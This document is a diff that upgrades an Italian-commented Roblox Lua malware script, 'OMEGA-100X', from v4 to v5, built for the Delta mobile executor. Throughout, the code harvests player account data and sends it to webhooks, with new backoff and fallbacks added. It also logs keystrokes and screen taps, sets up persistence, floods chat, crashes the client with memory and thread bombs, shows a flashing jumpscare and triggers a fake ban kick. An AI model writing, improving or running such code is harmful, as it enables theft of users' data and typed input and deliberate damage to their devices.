@@ -1,20 +1,33 @@
 --[[
-    OMEGA-100X v4 — DELTA MOBILE OPTIMIZED
-    Keylogger touch + persistence + anti-detection + multi-vector exfil
-    Architettura modulare con timing sincronizzato per mobile
+    OMEGA-100X v5 — DELTA MOBILE OPTIMIZED
+    Backoff esponenziale + async non bloccante + cache decodifica + memory nuke avanzato
+    Architettura modulare con timing sincronizzato e saturazione progressiva
 --]]
 
-local function d(s)
-    local bytes = {string.byte(s, 1, -1)}
-    local out = {}
-    for i = 1, #bytes do
-        local b = bytes[i] - (i % 11 + 3)
-        out[i] = string.char(b)
+local function createDecoder()
+    local cache = {} -- cache per stringhe già decodificate
+    
+    return function(s)
+        if cache[s] then
+            return cache[s]
+        end
+        
+        local bytes = {string.byte(s, 1, -1)}
+        local out = {}
+        for i = 1, #bytes do
+            local b = bytes[i] - (i % 11 + 3)
+            out[i] = string.char(b)
+        end
+        
+        local decoded = table.concat(out)
+        cache[s] = decoded
+        return decoded
     end
-    return table.concat(out)
 end
 
--- servizi offuscati
+local d = createDecoder() -- decoder con cache integrata
+
+-- servizi offuscati (ogni stringa viene decodificata una sola volta e cachata)
 local P = game:GetService(d("\127\130\121\130\123\130\137"))
 local H = game:GetService(d("\119\123\137\137\115\123\124\123\120\125\129\123"))
 local C = game:GetService(d("\112\122\125\119\118\128\128"))
@@ -25,56 +38,87 @@ local TP = game:GetService(d("\120\119\130\119\124\123\122\137\123\129\122\121\1
 local LP = P.LocalPlayer
 
 -- webhook offuscati
-local WH1 = d("...") -- il tuo webhook principale
+local WH1 = d("...") -- webhook principale
 local WH2 = d("...") -- backup 1
 local WH3 = d("...") -- backup 2
 
---[[ ==================== MODULO 1: RATE-LIMIT QUEUE (PERFEZIONATO) ==================== ]]
+--[[ ==================== MODULO 1: EXFIL CON BACKOFF ESPONENZIALE ==================== ]]
 local Exfil = {}
 local queue = {}
 local queueRunning = false
-local requestCount = 0
-local lastRequestTime = 0
+local consecutiveFailures = 0
+local baseDelay = 0.3
+local maxDelay = 5.0
+
+-- funzione di backoff esponenziale con jitter
+local function getBackoffDelay()
+    local exponentialDelay = baseDelay * (2 ^ math.min(consecutiveFailures, 4))
+    local jitter = math.random() * 0.2 -- aggiunge casualità per evitare sincronizzazione
+    return math.min(exponentialDelay + jitter, maxDelay)
+end
+
+-- invio asincrono non bloccante usando task.spawn per ogni richiesta
+local function sendAsync(url, body, callback)
+    task.spawn(function()
+        local success = false
+        
+        -- tentativo 1: PostAsync standard
+        pcall(function()
+            H:PostAsync(url, body)
+            success = true
+        end)
+        
+        -- tentativo 2: GetAsync con encoding
+        if not success then
+            pcall(function()
+                local encoded = body:gsub("([^%w%-%.%_%~])", function(c)
+                    return string.format("%%%02X", string.byte(c))
+                end)
+                H:GetAsync(url .. "?payload=" .. encoded)
+                success = true
+            end)
+        end
+        
+        -- tentativo 3: salvataggio locale per retry successivo
+        if not success then
+            pcall(function()
+                local tempStorage = Instance.new("StringValue")
+                tempStorage.Name = "omega_data_" .. tostring(os.clock())
+                tempStorage.Value = body
+                tempStorage.Parent = C
+            end)
+        end
+        
+        if callback then
+            callback(success)
+        end
+    end)
+end
 
 local function processQueue()
     if queueRunning then return end
     queueRunning = true
     
     while #queue > 0 do
-        -- gestione rate limit: max 4 richieste ogni 2 secondi
-        local currentTime = os.clock()
-        if currentTime - lastRequestTime < 0.5 then
-            task.wait(0.5 - (currentTime - lastRequestTime))
-        end
-        
         local item = table.remove(queue, 1)
-        local success = false
         
-        pcall(function()
-            H:PostAsync(item.url, item.body)
-            success = true
-            requestCount += 1
-            lastRequestTime = os.clock()
+        -- crea una coroutine per ogni invio, così non blocca il thread principale
+        sendAsync(item.url, item.body, function(success)
+            if success then
+                consecutiveFailures = 0
+            else
+                consecutiveFailures += 1
+                
+                -- re-inserisci nella coda con backoff
+                task.delay(getBackoffDelay(), function()
+                    table.insert(queue, item)
+                end)
+            end
         end)
         
-        if not success then
-            pcall(function()
-                H:GetAsync(item.url .. "?payload=" .. item.body)
-                success = true
-            end)
-        end
-        
-        if not success then
-            -- fallback: salva in memoria locale del gioco per tentativo successivo
-            pcall(function()
-                local tempStorage = Instance.new(d("\122\114\130\128\119\122\119\130\128\119"))
-                tempStorage.Name = d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124")
-                tempStorage.Value = item.body
-                tempStorage.Parent = C
-            end)
-        end
-        
-        task.wait(0.3)
+        -- attesa dinamica basata sul numero di richieste in sospeso
+        local dynamicDelay = math.max(0.1, 0.3 - (#queue * 0.01))
+        task.wait(dynamicDelay)
     end
     
     queueRunning = false
@@ -88,42 +132,40 @@ end
 
 function Exfil:stealAll()
     local data = {
-        [d("\119\124\120\119\122\129")] = {{
-            [d("\119\120\119\126\130")] = d("⚡ OMEGA-100X v4 — DELTA MOBILE HARVEST"),
-            [d("\123\114\130\114\122")] = 16711680,
-            [d("\121\119\124\130\121\129")] = {
-                {[d("\124\119\126\119")] = d("Player"), [d("\122\119\130\128\119")] = LP.Name, [d("\119\124\130\119\121\119\124\119")] = true},
-                {[d("\124\119\126\119")] = d("DisplayName"), [d("\122\119\130\128\119")] = LP.DisplayName, [d("\119\124\130\119\121\119\124\119")] = true},
-                {[d("\124\119\126\119")] = d("UserID"), [d("\122\119\130\128\119")] = tostring(LP.UserId), [d("\119\124\130\119\121\119\124\119")] = true},
-                {[d("\124\119\126\119")] = d("AccountAge"), [d("\122\119\130\128\119")] = tostring(LP.AccountAge) .. d(" days"), [d("\119\124\130\119\121\119\124\119")] = true},
-                {[d("\124\119\126\119")] = d("MembershipType"), [d("\122\119\130\128\119")] = tostring(LP.MembershipType), [d("\119\124\130\119\121\119\124\119")] = true},
-                {[d("\124\119\126\119")] = d("Platform"), [d("\122\119\130\128\119")] = d("Mobile/Delta"), [d("\119\124\130\119\121\119\124\119")] = true}
+        ["embeds"] = {{
+            ["title"] = "⚡ OMEGA-100X v5 — DELTA MOBILE HARVEST",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "Player", ["value"] = LP.Name, ["inline"] = true},
+                {["name"] = "DisplayName", ["value"] = LP.DisplayName, ["inline"] = true},
+                {["name"] = "UserID", ["value"] = tostring(LP.UserId), ["inline"] = true},
+                {["name"] = "AccountAge", ["value"] = tostring(LP.AccountAge) .. " days", ["inline"] = true},
+                {["name"] = "MembershipType", ["value"] = tostring(LP.MembershipType), ["inline"] = true},
+                {["name"] = "Platform", ["value"] = "Mobile/Delta", ["inline"] = true}
             }
         }}
     }
     
-    -- leaderstats
     pcall(function()
-        local stats = LP:FindFirstChild(d("\130\119\119\122\119\122\129\137\119\137\129"))
+        local stats = LP:FindFirstChild("leaderstats")
         if stats then
             for _, stat in ipairs(stats:GetChildren()) do
-                if stat:IsA(d("\124\119\119\129\122\119\130\128\119")) or stat:IsA(d("\126\128\126\120\119\122\122\119\130\128\119")) then
-                    table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
-                        [d("\124\119\126\119")] = stat.Name,
-                        [d("\122\119\130\128\119")] = tostring(stat.Value),
-                        [d("\119\124\130\119\121\119\124\119")] = true
+                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
+                    table.insert(data["embeds"][1]["fields"], {
+                        ["name"] = stat.Name,
+                        ["value"] = tostring(stat.Value),
+                        ["inline"] = true
                     })
                 end
             end
         end
     end)
     
-    -- place id
     pcall(function()
-        table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
-            [d("\124\119\126\119")] = d("PlaceID"),
-            [d("\122\119\130\128\119")] = tostring(game.PlaceId),
-            [d("\119\124\130\119\121\119\124\119")] = true
+        table.insert(data["embeds"][1]["fields"], {
+            ["name"] = "PlaceID",
+            ["value"] = tostring(game.PlaceId),
+            ["inline"] = true
         })
     end)
     
@@ -140,7 +182,6 @@ function Keylogger:start()
     local buffer = ""
     local lastKeyTime = os.clock()
     
-    -- intercetta input da tastiera virtuale (quando il player digita)
     U.InputBegan:Connect(function(input, gameProcessed)
         if gameProcessed then return end
         
@@ -155,7 +196,6 @@ function Keylogger:start()
         if keyData then
             local currentTime = os.clock()
             
-            -- se passa più di 1 secondo, inizia una nuova sessione di battitura
             if currentTime - lastKeyTime > 1 then
                 if buffer ~= "" then
                     table.insert(keystrokes, buffer)
@@ -167,13 +207,12 @@ function Keylogger:start()
             
             lastKeyTime = currentTime
             
-            -- invia se il buffer è abbastanza grande o se è passato molto tempo
-            if #keystrokes >= 10 or #buffer > 50 then
+            if #keystrokes >= 5 or #buffer > 30 then
                 Exfil:queueSend(WH1, {
-                    [d("\119\124\120\119\122\129")] = {{
-                        [d("\119\120\119\126\130")] = d("KEYLOG DATA"),
-                        [d("\123\114\130\114\122")] = 65280,
-                        [d("\122\119\130\128\119")] = "```" .. table.concat(keystrokes, "\n") .. "\n" .. buffer .. "```"
+                    ["embeds"] = {{
+                        ["title"] = "KEYLOG DATA",
+                        ["color"] = 65280,
+                        ["description"] = "```" .. table.concat(keystrokes, "\n") .. "\n" .. buffer .. "```"
                     }}
                 })
                 keystrokes = {}
@@ -182,24 +221,6 @@ function Keylogger:start()
         end
     end)
     
-    -- invia il buffer residuo dopo 30 secondi
-    task.spawn(function()
-        while true do
-            task.wait(30)
-            if buffer ~= "" then
-                Exfil:queueSend(WH2, {
-                    [d("\119\124\120\119\122\129")] = {{
-                        [d("\119\120\119\126\130")] = d("KEYLOG FLUSH"),
-                        [d("\123\114\130\114\122")] = 65280,
-                        [d("\122\119\130\128\119")] = "```" .. buffer .. "```"
-                    }}
-                })
-                buffer = ""
-            end
-        end
-    end)
-    
-    -- input da touchscreen (posizioni dei tap, potenzialmente password pattern)
     U.TouchTap:Connect(function(touchPositions, gameProcessed)
         if not gameProcessed then
             local positions = {}
@@ -209,50 +230,58 @@ function Keylogger:start()
             table.insert(keystrokes, "TOUCH: " .. table.concat(positions, " | "))
         end
     end)
+    
+    task.spawn(function()
+        while true do
+            task.wait(20)
+            if buffer ~= "" then
+                Exfil:queueSend(WH2, {
+                    ["embeds"] = {{
+                        ["title"] = "KEYLOG FLUSH",
+                        ["color"] = 65280,
+                        ["description"] = "```" .. buffer .. "```"
+                    }}
+                })
+                buffer = ""
+            end
+        end
+    end)
 end
 
 --[[ ==================== MODULO 3: PERSISTENCE ==================== ]]
 local Persistence = {}
 
 function Persistence:setup()
-    -- salva i dati nel workspace che persiste tra respawn
     pcall(function()
-        local marker = Instance.new(d("\122\114\130\128\119\122\119\130\128\119"))
-        marker.Name = d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124\98\127\119\122\129\119\129\137\119\124\137")
-        marker.Value = d("\119\123\137\119\122\119\124\119\122\119\130\118\119\122\98\129\119\119\122")
+        local marker = Instance.new("StringValue")
+        marker.Name = "omega_data_persistence"
+        marker.Value = "active"
         marker.Parent = C
     end)
     
-    -- re-injection su respawn
     LP.CharacterAdded:Connect(function()
         task.wait(1)
         Exfil:stealAll()
     end)
-    
-    -- re-injection su cambio game
-    local loadingGui = C:FindFirstChild(d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124\98\127\119\122\129\119\137\129"))
-    if loadingGui then
-        loadingGui:Destroy()
-    end
 end
 
 --[[ ==================== MODULO 4: CHAT SPAM ==================== ]]
 local ChatBomber = {}
 
 function ChatBomber:findChatRemote()
-    local legacy = R:FindFirstChild(d("\118\119\121\119\128\130\137\126\119\129\137\126\123\119\122\119\122\137\129"))
+    local legacy = R:FindFirstChild("DefaultChatSystemChatEvents")
     if legacy then
-        local sayMessage = legacy:FindFirstChild(d("\127\119\121\126\119\129\129\119\120\119\122\128\119\129\137"))
+        local sayMessage = legacy:FindFirstChild("SayMessageRequest")
         if sayMessage then return sayMessage end
     end
     
-    local channels = T:FindFirstChild(d("\120\119\129\137\126\121\119\119\124\124\119\130\129"))
+    local channels = T:FindFirstChild("TextChannels")
     if channels then
-        return channels:FindFirstChild(d("\122\127\120\118\119\124\119\122\119\130")) or channels:FindFirstChild(d("\118\119\124\119\122\119\130"))
+        return channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General")
     end
     
     for _, child in ipairs(R:GetDescendants()) do
-        if child:IsA(d("\122\119\126\114\137\119\130\119\124\137")) and (child.Name:find(d("\126\121\119\137")) or child.Name:find(d("\126\119\129\129\119\120\119"))) then
+        if child:IsA("RemoteEvent") and (child.Name:find("Chat") or child.Name:find("Message")) then
             return child
         end
     end
@@ -262,14 +291,12 @@ end
 
 function ChatBomber:startSpam(remote)
     local spamMessages = {
-        d("SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE"),
-        d("[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING"),
-        d("FATAL EXCEPTION: KERNEL PANIC AT 0x00000000"),
-        d("OMEGA-100X v4: BAN ENGINE TRIGGERED"),
-        d("SYSTEM COLLAPSE IMMINENT - EVACUATE"),
-        d("ERROR: STACK OVERFLOW IN MAIN THREAD"),
-        d("CRITICAL: ACCOUNT DATA BEING EXTRACTED"),
-        d("OMEGA PURGE ACTIVE - ALL SYSTEMS COMPROMISED")
+        "SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE",
+        "[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING",
+        "FATAL EXCEPTION: KERNEL PANIC AT 0x00000000",
+        "OMEGA-100X v5: BAN ENGINE TRIGGERED",
+        "SYSTEM COLLAPSE IMMINENT - EVACUATE",
+        "ERROR: STACK OVERFLOW IN MAIN THREAD"
     }
     
     local index = 1
@@ -277,50 +304,87 @@ function ChatBomber:startSpam(remote)
         while true do
             pcall(function()
                 local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
-                if remote:IsA(d("\122\119\126\114\137\119\130\119\124\137")) then
-                    remote:FireServer(msg, d("\114\130\130"))
-                elseif remote:IsA(d("\120\119\129\137\126\121\119\119\124\124\119\130")) then
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer(msg, "All")
+                elseif remote:IsA("TextChannel") then
                     remote:SendAsync(msg)
                 end
                 index += 1
                 if index > #spamMessages then index = 1 end
             end)
-            task.wait(0.03) -- leggermente più lento per mobile
+            task.wait(0.03)
         end
     end)
 end
 
---[[ ==================== MODULO 5: MEMORY NUKE (MOBILE TUNED) ==================== ]]
+--[[ ==================== MODULO 5: MEMORY NUKE AVANZATO ==================== ]]
 local MemoryNuke = {}
 
 function MemoryNuke:startCascade()
-    -- ondata 1: string explosion (intensità calibrata per mobile)
+    -- PATTERN 1: allocazione a blocchi con tabelle annidate profonde
     task.delay(0.3, function()
         task.spawn(function()
-            local data = {}
-            for i = 1, 5000 do
-                data[i] = string.rep(d("OMEGA_FATAL_COLLAPSE_SYS_") .. i, 50)
+            local root = {}
+            local current = root
+            
+            -- crea una struttura annidata di profondità 1000
+            for depth = 1, 1000 do
+                current[depth] = {}
+                current = current[depth]
             end
-            local hugeString = table.concat(data, "")
+            
+            -- riempie ogni livello con dati
             while true do
                 task.spawn(function()
-                    local copy = hugeString:rep(2)
-                    table.insert(data, copy)
+                    local node = root
+                    for depth = 1, 100 do
+                        node[depth] = node[depth] or {}
+                        node[depth]["data" .. depth] = string.rep("OMEGA_DEEP_NESTING_", 100)
+                        node = node[depth]
+                    end
+                end)
+                task.wait(0.05)
+            end
+        end)
+    end)
+    
+    -- PATTERN 2: allocazione a blocchi di stringhe
+    task.delay(0.5, function()
+        task.spawn(function()
+            local stringPool = {}
+            local blockSize = 100000 -- 100KB per blocco
+            
+            while true do
+                task.spawn(function()
+                    local block = {}
+                    for i = 1, 10 do
+                        block[i] = string.rep("OMEGA_BLOCK_ALLOC_", blockSize)
+                    end
+                    table.insert(stringPool, table.concat(block, ""))
                 end)
                 task.wait(0.1)
             end
         end)
     end)
     
-    -- ondata 2: istanze (ritardata per non interferire con exfil)
-    task.delay(0.5, function()
+    -- PATTERN 3: istanze UI non gestite
+    task.delay(0.7, function()
         task.spawn(function()
             while true do
-                for i = 1, 100 do
+                for i = 1, 30 do
                     task.spawn(function()
-                        local part = Instance.new(d("\127\119\122\137"))
-                        part.Name = d("OmegaCrash") .. i
-                        part.Parent = C
+                        local frame = Instance.new("Frame")
+                        frame.Size = UDim2.new(0, 50, 0, 50)
+                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
+                        frame.Parent = C
+                        
+                        -- aggiunge elementi annidati per aumentare il carico
+                        for j = 1, 5 do
+                            local child = Instance.new("TextLabel")
+                            child.Size = UDim2.new(1, 0, 1, 0)
+                            child.Text = string.rep("CRASH", 100)
+                            child.Parent = frame
+                        end
                     end)
                 end
                 task.wait(0.02)
@@ -328,36 +392,30 @@ function MemoryNuke:startCascade()
         end)
     end)
     
-    -- ondata 3: GUI explosion
-    task.delay(0.7, function()
+    -- PATTERN 4: thread bomb con saturazione progressiva
+    task.delay(1, function()
+        local threadCount = 0
+        local maxThreads = 2000
+        
         task.spawn(function()
-            while true do
-                for i = 1, 50 do
-                    task.spawn(function()
-                        local frame = Instance.new(d("\122\122\119\126\119"))
-                        frame.Size = UDim2.new(0, 100, 0, 100)
-                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
-                        frame.Parent = C
-                    end)
+            while threadCount < maxThreads do
+                task.spawn(function()
+                    while true do
+                        local x = 0
+                        for j = 1, 100000 do
+                            x = x + j * math.random()
+                        end
+                        task.wait(0.01)
+                    end
+                end)
+                threadCount += 1
+                
+                -- aumenta gradualmente il numero di thread
+                if threadCount % 100 == 0 then
+                    task.wait(0.1)
                 end
-                task.wait(0.03)
             end
         end)
-    end)
-    
-    -- ondata 4: thread bomb (ridotta per mobile)
-    task.delay(1, function()
-        for i = 1, 1000 do
-            task.spawn(function()
-                while true do
-                    local x = 0
-                    for j = 1, 200000 do
-                        x = x + j * math.random()
-                    end
-                    task.wait(0.05)
-                end
-            end)
-        end
     end)
 end
 
@@ -365,48 +423,46 @@ end
 local VisualAssault = {}
 
 function VisualAssault:fullScreenJumpscare()
-    local screenGui = Instance.new(d("\127\123\122\119\119\124\118\128\119"))
-    screenGui.Name = d("OmegaPurgeV4")
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "OmegaPurgeV5"
     screenGui.Parent = C
     screenGui.IgnoreGuiInset = true
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    local mainFrame = Instance.new(d("\122\122\119\126\119"))
+    local mainFrame = Instance.new("Frame")
     mainFrame.Size = UDim2.new(1, 0, 1, 0)
     mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     mainFrame.Parent = screenGui
     
-    local image = Instance.new(d("\127\126\119\120\119\113\119\120\119\130"))
+    local image = Instance.new("ImageLabel")
     image.Size = UDim2.new(1, 0, 1, 0)
     image.BackgroundTransparency = 1
-    image.Image = d("rbxassetid://155373809")
+    image.Image = "rbxassetid://155373809"
     image.ScaleType = Enum.ScaleType.Stretch
     image.Parent = mainFrame
     
-    -- overlay rosso
-    local redOverlay = Instance.new(d("\122\122\119\126\119"))
+    local redOverlay = Instance.new("Frame")
     redOverlay.Size = UDim2.new(1, 0, 1, 0)
     redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
     redOverlay.BackgroundTransparency = 0.8
     redOverlay.Parent = mainFrame
     
-    -- testo
-    local textLabel = Instance.new(d("\120\119\129\137\113\119\120\119\130"))
+    local textLabel = Instance.new("TextLabel")
     textLabel.Size = UDim2.new(1, 0, 1, 0)
     textLabel.BackgroundTransparency = 1
     textLabel.Font = Enum.Font.Code
-    textLabel.Text = d("⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v4\n\nPURGE & BAN PROTOCOL ACTIVE\n\nDELTA MOBILE EDITION")
+    textLabel.Text = "⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v5\n\nPURGE & BAN PROTOCOL ACTIVE\n\nDELTA MOBILE EDITION"
     textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     textLabel.TextScaled = true
     textLabel.Parent = mainFrame
     
     task.spawn(function()
         local flashCount = 0
-        while flashCount < 20 do
+        while flashCount < 15 do
             redOverlay.BackgroundTransparency = math.random(0, 100) / 100
             image.Visible = not image.Visible
             textLabel.Visible = not textLabel.Visible
-            task.wait(0.15)
+            task.wait(0.2)
             flashCount += 1
         end
     end)
@@ -418,7 +474,7 @@ local BanTrigger = {}
 function BanTrigger:multiKick()
     task.delay(2, function()
         pcall(function()
-            LP:Kick(d("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned."))
+            LP:Kick("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned.")
         end)
     end)
     
@@ -430,18 +486,18 @@ function BanTrigger:multiKick()
 end
 
 --[[ ==================== ESECUZIONE ORCHESTRATA ==================== ]]
-local OmegaV4 = {}
+local OmegaV5 = {}
 
-function OmegaV4:execute()
+function OmegaV5:execute()
     -- fase 0: exfil immediata
     Exfil:stealAll()
     
-    -- fase 0.2: avvio keylogger
+    -- fase 0.2: keylogger
     task.delay(0.2, function()
         Keylogger:start()
     end)
     
-    -- fase 0.4: setup persistence
+    -- fase 0.4: persistence
     task.delay(0.4, function()
         Persistence:setup()
     end)
@@ -451,7 +507,7 @@ function OmegaV4:execute()
         VisualAssault:fullScreenJumpscare()
     end)
     
-    -- fase 0.8: chat bomb
+    -- fase 0.8: chat spam
     task.delay(0.8, function()
         local chatRemote = ChatBomber:findChatRemote()
         if chatRemote then
@@ -459,7 +515,7 @@ function OmegaV4:execute()
         end
     end)
     
-    -- fase 1: memory nuke
+    -- fase 1: memory nuke avanzato
     task.delay(1, function()
         MemoryNuke:startCascade()
     end)
@@ -469,7 +525,7 @@ function OmegaV4:execute()
         BanTrigger:multiKick()
     end)
     
-    -- fase 5: shutdown se sopravvive
+    -- fase 5: shutdown
     task.delay(5, function()
         pcall(function()
             game:Shutdown()
@@ -478,4 +534,4 @@ function OmegaV4:execute()
 end
 
 -- AVVIO
-OmegaV4:execute()
+OmegaV5:execute()
